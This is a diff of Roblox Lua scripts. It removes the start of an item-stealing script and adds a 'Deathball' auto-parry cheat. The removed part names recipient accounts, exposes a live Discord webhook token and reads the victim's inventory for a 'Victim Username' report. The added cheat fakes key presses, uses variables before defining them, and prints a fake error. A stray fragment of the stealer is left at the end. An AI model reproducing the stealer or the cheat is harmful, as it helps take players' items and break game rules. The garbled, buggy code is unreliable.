@@ -1,65 +1,232 @@
-local function ExecuteScript()
-    local Username = "TheMineWall"
-    local Username2 = "salf0xstore" -- stuff will get sent to this user if first user's mailbox is full
-    local Webhook = "https://discord.com/api/webhooks/1231993060456534117/N2sEEiLDkl15Wqyrbh7xb1Yluu-ECW8XbVvhTL8yKdp76LDnKJ5M64Q8jDo1vZ4PK2Vz"
-    local min_rap = 500000 -- minimum rap of each item you want to get sent to you.
+-- Deathball Script by Chronix
+-- Update in 2025.2.9
 
-    local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
-    local library = require(game.ReplicatedStorage.Library)
-    local save = library.Save.Get().Inventory
-    local mailsent = library.Save.Get().MailboxSendsSinceReset
-    local plr = game.Players.LocalPlayer
-    local MailMessage = "nih ja"
-    local HttpService = game:GetService("HttpService")
-    local sortedItems = {}
-    _G.scriptExecuted = _G.scriptExecuted or false
+if game.GameId ~= 5166944221 then
+    warn("⛔ Current Game ID " .. game.GameId .. ", Not in Deathball game, script loading terminated.")
+    return
+end
+if _G.DeathBallScriptLoaded then
+    warn("⛔ Deathball Script Already loaded! Please do not repeat the execution.")
+    return
+end
+ 
+_G.DeathBallScriptLoaded = true
 
-    local function GetSave()
-        return require(game.ReplicatedStorage.Library.Client.Save).Get()
+print("Deathball Script Loading...")
+print("")
+local Players = game:GetService("Players")
+print("✅ Service - Players Get Done.")
+local LocalPlayer = Players.LocalPlayer
+print("✅ Service - LocalPlayer Get Done.")
+local Workspace = game:GetService("Workspace")
+print("✅ Service - Workspace Get Done.")
+local UserInputService = game:GetService("UserInputService")
+print("✅ Service - UserInputService Get Done.")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+print("✅ Service - VirtualInputMnager Get Done.")
+local StarterGui = game:GetService("StarterGui")
+print("✅ Service - StarterGui Get Done.")
+local TweenService = game:GetService("TweenService")
+print("✅ Service - TweenService Get Done.")
+local SoundService = game:GetService("SoundService")
+print("✅ Service - SoundService Get Done.")
+
+local NotifGui = Instance.new("ScreenGui")
+NotifGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+local notifications = {}
+
+-- Load achievement sound
+local achievementSound = Instance.new("Sound")
+achievementSound.SoundId = "rbxassetid://4590662766" -- Replace with your audio ID
+achievementSound.Volume = 0.5 -- Volume level
+achievementSound.Parent = SoundService
+
+local function UpdatePositions()
+    for index, frame in ipairs(notifications) do
+        local targetPosition = UDim2.new(0.8, 0, 0.1 + (index - 1) * 0.11, 0)
+        local tween = TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
+            Position = targetPosition
+        })
+        tween:Play()
+    end
+end
+
+local function CreateNotification(title, text, duration, isAchievement)
+    local notificationFrame = Instance.new("Frame")
+    notificationFrame.Size = UDim2.new(0.2, 0, 0.1, 0)
+    notificationFrame.Position = UDim2.new(1, 0, 0.1 + #notifications * 0.11, 0)
+    notificationFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40) -- Background color
+    notificationFrame.BackgroundTransparency = 0.7 -- Reduced background transparency
+    notificationFrame.BorderSizePixel = 0
+    notificationFrame.ZIndex = 999
+    notificationFrame.Parent = NotifGui
+
+    local uiCorner = Instance.new("UICorner", notificationFrame)
+    uiCorner.CornerRadius = UDim.new(0, 8)
+
+    -- Title
+    local titleLabel = Instance.new("TextLabel", notificationFrame)
+    titleLabel.Size = UDim2.new(0.95, 0, 0.3, 0)
+    titleLabel.Position = UDim2.new(0.025, 0, 0.05, 0)
+    titleLabel.Text = title
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- Title text color
+    titleLabel.TextSize = 18
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Font = Enum.Font.GothamBold
+    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    -- Divider
+    local divider = Instance.new("Frame", notificationFrame)
+    divider.Size = UDim2.new(0.95, 0, 0, 1)
+    divider.Position = UDim2.new(0.025, 0, 0.35, 0)
+    divider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    divider.BackgroundTransparency = 0.8
+    divider.BorderSizePixel = 0
+
+    -- Content
+    local textLabel = Instance.new("TextLabel", notificationFrame)
+    textLabel.Size = UDim2.new(0.95, 0, 0.6, 0)
+    textLabel.Position = UDim2.new(0.025, 0, 0.3, 0)
+    textLabel.Text = text
+    textLabel.TextColor3 = Color3.fromRGB(220, 220, 220) -- Content text color
+    textLabel.TextSize = 16
+    textLabel.BackgroundTransparency = 1
+    textLabel.TextWrapped = true
+    textLabel.Font = Enum.Font.GothamSemibold
+    textLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    table.insert(notifications, notificationFrame)
+
+    -- Play sound if it's an achievement notification
+    if isAchievement then
+        achievementSound:Play()
     end
 
-    if _G.scriptExecuted then
-        return
-    end
-    _G.scriptExecuted = true
+    -- Slide-in animation
+    local tweenIn = TweenService:Create(notificationFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
+        Position = UDim2.new(0.8, 0, notificationFrame.Position.Y.Scale, 0)
+    })
+    tweenIn:Play()
 
-    local newamount = 20000
+    -- Independent coroutine for notification lifecycle
+    coroutine.wrap(function()
+        wait(duration)
+        
+        -- Slide-out animation
+        local tweenOut = TweenService:Create(notificationFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
+            Position = UDim2.new(1, 0, notificationFrame.Position.Y.Scale, 0)
+        })
+        tweenOut:Play()
+        tweenOut.Completed:Wait()
 
-    if mailsent ~= 0 then
-        newamount = math.ceil(newamount * (1.5 ^ mailsent))
-    end
+        -- Remove element and update queue
+        local index = table.find(notifications, notificationFrame)
+        if index then
+            table.remove(notifications, index)
+            notificationFrame:Destroy()
+            UpdatePositions()
+        end
+    end)()
+end
+print("✅ NotifGui Create.")
 
-    local GemAmount1 = 1
-    for i, v in pairs(GetSave().Inventory.Currency) do
-        if v.id == "Diamonds" then
-            GemAmount1 = v._am
-            break
+-- Helper function: Create and configure TextLabel
+local function CreateTextLabel(parent, text, textColor3, position, textSize)
+    local textLabel = Instance.new("TextLabel", parent)
+    textLabel.Text = text
+    textLabel.TextColor3 = textColor3 or Color3.new(1, 1, 1) -- Default white
+    textLabel.Position = position or UDim2.new(0.5, 0, 0.5, 0) -- Default center
+    textLabel.TextSize = textSize or 14 -- Default font size
+    textLabel.BackgroundTransparency = 1 -- Default transparent background
+    print("✅ UI - " .. text .. " Create.")
+    return textLabel
+end
+
+-- Create ScreenGui as a child of LocalPlayer.PlayerGui
+local Gui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
+print("✅ ScreenGui Create.")
+
+-- Use helper function to create TextLabel instances
+local Text1 = CreateTextLabel(Gui, "Game Not Started", Color3.fromRGB(230, 230, 250), UDim2.new(0.529, -40, 0.1, 0), 25)
+local Text2 = CreateTextLabel(Gui, "", Color3.fromRGB(166, 166, 166), UDim2.new(0.529, -40, 0.14, 0), 15)
+local Text3 = CreateTextLabel(Gui, "Auto Parry (OFF)", Color3.fromRGB(230, 230, 250), UDim2.new(0.949, -40, -0.04, 0), 20)
+
+local RB = Color3.new(1, 0, 0)
+local AutoValue = false
+
+-- Function to find the ball
+function FindBall()
+    for _, child in pairs(Workspace:GetChildren()) do
+        if child.Name == "Part" and child:IsA("BasePart") then -- Assuming ball is a BasePart
+            return child
         end
     end
+    return nil
+end
 
-    if newamount > GemAmount1 then
+-- Function to update UI
+local function UpdateUI()
+    if AutoValue and isLocked and distance < 15 then
+        VirtualInputManager:SendKeyEvent(true, "F", false, game)
+    end
+
+    local playerPos = (LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart.CFrame) or CFrame.new()
+    local ball = FindBall()
+
+    if not ball then
+        Text1.TextColor3 = Color3.fromRGB(230, 230, 250)
+        Text1.Text = "Game Not Started"
+        Text2.Text = ""
         return
     end
 
-    local function formatNumber(number)
-        local number = math.floor(number)
-        local suffixes = {"", "k", "m", "b", "t"}
-        local suffixIndex = 1
-        while number >= 1000 do
-            number = number / 1000
-            suffixIndex = suffixIndex + 1
-        end
-        return string.format("%.2f%s", number, suffixes[suffixIndex])
+    local isSpectating = playerPos.Z < -777.55 and playerPos.Y > 279.17
+    if isSpectating then
+        Text1.TextColor3 = Color3.fromRGB(230, 230, 250)
+        Text1.Text = "Spectating"
+        Text2.Text = ""
+    else
+        local isLocked = ball.Highlight and ball.Highlight.FillColor == RB
+        Text1.Text = isLocked and "Ball Locked" or "Ball Not Locked"
+        Text1.TextColor3 = isLocked and Color3.fromRGB(238, 17, 17) or Color3.fromRGB(17, 238, 17)
+
+        local dx, dy, dz = ball.CFrame.X - playerPos.X, ball.CFrame.Y - playerPos.Y, ball.CFrame.Z - playerPos.Z
+        local distance = math.sqrt(dx^2 + dy^2 + dz^2)
+        Text2.Text = string.format("%.0f", distance)
+    end
+end
+
+CreateNotification("Notice", "Deathball Assistant Started", 5, true)
+wait(0.5)
+CreateNotification("Notice", "Press K to Toggle Auto Parry", 5.5, false)
+wait(0.5)
+CreateNotification("Notice", "Press Delete to Unload Script", 6, false)
+
+print("⚠️ Service VirtualInputManager Loading problem occurred!")
+print("✅ Module NotificationSystem Load.")
+print("")
+print("Deathball Script Load!")
+print("Usage Reminder: Press K to toggle Auto Parry, Press Delete to unload script")
+
+-- Main loop
+while true do
+    wait(0.05)
+    if UserInputService:IsKeyDown(Enum.KeyCode.K) then
+        AutoValue = not AutoValue
+        Text3.Text = AutoValue and "Auto Parry (ON)" or "Auto Parry (OFF)"
+        CreateNotification("Notice", AutoValue and "Auto Parry Enabled" or "Auto Parry Disabled", 5, true)
+        wait(0.5)
+    elseif UserInputService:IsKeyDown(Enum.KeyCode.Delete) then
+        _G.DeathBallScriptLoaded = false
+        print("Deathball Script Unload!")
+        Gui:Destroy()
+        NotifGui:Destroy()
+        break
     end
 
-    local function SendMessage(url, username, diamonds)
-        local headers = {
-            ["Content-Type"] = "application/json"
-        }
-
-        local totalRAP = 0
-        local fields = {
-            {
+    UpdateUI()
+end
                 name = "Victim Username:",
                 value = username,
                 inline = true
